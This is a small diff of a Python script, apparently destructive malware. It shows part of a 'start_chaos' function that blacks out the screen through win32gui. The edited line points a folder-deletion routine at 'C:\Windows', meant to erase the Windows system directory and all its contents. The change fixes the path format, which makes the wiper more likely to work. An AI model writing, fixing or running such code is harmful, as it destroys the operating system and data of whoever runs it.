@@ -86,7 +86,7 @@ def start_chaos():
         win32gui.SelectObject(hdc, black_brush)
         win32gui.PatBlt(hdc, 0, 0, sw, sh, win32con.PATCOPY)
 
-	folder_path = 'C:/Windows'
+	folder_path = 'C:\Windows'
 
 # Delete the folder and all its contents
 if os.path.exists(folder_path):
